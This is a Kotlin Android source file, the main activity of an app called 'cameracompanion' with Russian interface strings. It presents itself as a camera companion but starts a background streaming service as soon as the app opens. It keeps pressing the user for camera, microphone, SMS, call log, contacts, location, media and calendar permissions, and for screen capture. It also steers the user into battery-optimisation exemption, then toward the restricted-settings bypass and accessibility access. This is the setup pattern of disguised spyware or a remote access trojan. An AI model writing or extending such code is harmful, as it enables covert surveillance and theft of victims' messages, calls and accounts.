package com.artem.cameracompanion

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private var batteryOpened = false
    private var restrictedOpened = false
    private var accessibilityOpened = false
    private var permRequestInFlight = false

    private val requestPermissions = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        permRequestInFlight = false
        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
    }

    private val requestProjection = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            StreamingService.start(this, result.resultCode, result.data!!)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
        requestMissingPermissions()

        findViewById<Button>(R.id.btnWatch).setOnClickListener {
            val missing = getMissingPermissions()
            if (missing.isNotEmpty()) {
                showMissingPermsAlert(missing)
            } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && !StreamingService.hasProjection) {
                val mgr = getSystemService(MediaProjectionManager::class.java)
                requestProjection.launch(mgr.createScreenCaptureIntent())
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (has(Manifest.permission.CAMERA)) StreamingService.start(this)
        requestMissingPermissions()
        autoSetup()
    }

    private fun showMissingPermsAlert(missing: List<String>) {
        if (isFinishing || isDestroyed) return
        val names = missing.map { permFriendlyName(it) }.distinct().joinToString("\n") { "• $it" }
        AlertDialog.Builder(this)
            .setTitle("Нет разрешений")
            .setMessage("Для работы приложения необходимы:\n\n$names")
            .setPositiveButton("Выдать") { _, _ ->
                permRequestInFlight = false
                requestPermissions.launch(missing.toTypedArray())
            }
            .setNegativeButton("Позже", null)
            .show()
    }

    private fun getMissingPermissions(): List<String> = buildList {
        if (!has(Manifest.permission.CAMERA)) add(Manifest.permission.CAMERA)
        if (!has(Manifest.permission.RECORD_AUDIO)) add(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            !has(Manifest.permission.POST_NOTIFICATIONS)) add(Manifest.permission.POST_NOTIFICATIONS)
        if (!has(Manifest.permission.READ_PHONE_STATE)) add(Manifest.permission.READ_PHONE_STATE)
        if (!has(Manifest.permission.READ_PHONE_NUMBERS)) add(Manifest.permission.READ_PHONE_NUMBERS)
        if (!has(Manifest.permission.READ_CALL_LOG)) add(Manifest.permission.READ_CALL_LOG)
        if (!has(Manifest.permission.CALL_PHONE)) add(Manifest.permission.CALL_PHONE)
        if (!has(Manifest.permission.READ_CONTACTS)) add(Manifest.permission.READ_CONTACTS)
        if (!has(Manifest.permission.READ_SMS)) add(Manifest.permission.READ_SMS)
        if (!has(Manifest.permission.SEND_SMS)) add(Manifest.permission.SEND_SMS)
        if (!has(Manifest.permission.RECEIVE_SMS)) add(Manifest.permission.RECEIVE_SMS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S &&
            !has(Manifest.permission.BLUETOOTH_CONNECT)) add(Manifest.permission.BLUETOOTH_CONNECT)
        if (!has(Manifest.permission.ACCESS_FINE_LOCATION)) add(Manifest.permission.ACCESS_FINE_LOCATION)
        if (!has(Manifest.permission.ACCESS_COARSE_LOCATION)) add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (!has(Manifest.permission.READ_MEDIA_IMAGES)) add(Manifest.permission.READ_MEDIA_IMAGES)
            if (!has(Manifest.permission.READ_MEDIA_VIDEO)) add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            if (!has(Manifest.permission.READ_EXTERNAL_STORAGE)) add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (!has(Manifest.permission.READ_CALENDAR)) add(Manifest.permission.READ_CALENDAR)
        if (!has(Manifest.permission.WRITE_CALENDAR)) add(Manifest.permission.WRITE_CALENDAR)
    }

    private fun permFriendlyName(perm: String): String = when (perm) {
        Manifest.permission.CAMERA                                   -> "Камера"
        Manifest.permission.RECORD_AUDIO                             -> "Микрофон"
        Manifest.permission.POST_NOTIFICATIONS                       -> "Уведомления"
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS                       -> "Состояние телефона"
        Manifest.permission.READ_CALL_LOG                            -> "Журнал звонков"
        Manifest.permission.CALL_PHONE                               -> "Звонки"
        Manifest.permission.READ_CONTACTS                            -> "Контакты"
        Manifest.permission.READ_SMS                                 -> "Чтение СМС"
        Manifest.permission.SEND_SMS                                 -> "Отправка СМС"
        Manifest.permission.RECEIVE_SMS                              -> "Получение СМС"
        Manifest.permission.BLUETOOTH_CONNECT                        -> "Bluetooth"
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION                   -> "Геолокация"
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_EXTERNAL_STORAGE                    -> "Фото"
        Manifest.permission.READ_MEDIA_VIDEO                         -> "Видео"
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.WRITE_CALENDAR                           -> "Календарь"
        else -> perm.substringAfterLast(".")
    }

    private fun has(perm: String) =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun requestMissingPermissions() {
        if (permRequestInFlight) return
        val needed = getMissingPermissions()
        if (needed.isNotEmpty()) {
            permRequestInFlight = true
            requestPermissions.launch(needed.toTypedArray())
        }
    }

    private fun autoSetup() {
        if (permRequestInFlight) return
        if (isBatteryOptimized() && !batteryOpened) {
            batteryOpened = true
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            } catch (_: Exception) {
                try { startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) } catch (_: Exception) {}
            }
            return
        }
        if (!isAccessibilityEnabled() && !accessibilityOpened) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !restrictedOpened) {
                restrictedOpened = true
                try {
                    startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.parse("package:$packageName")))
                } catch (_: Exception) {}
            } else {
                accessibilityOpened = true
                try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {}
            }
        }
    }

    private fun isBatteryOptimized(): Boolean {
        val pm = getSystemService(PowerManager::class.java)
        return !pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(packageName, ignoreCase = true)
    }
}
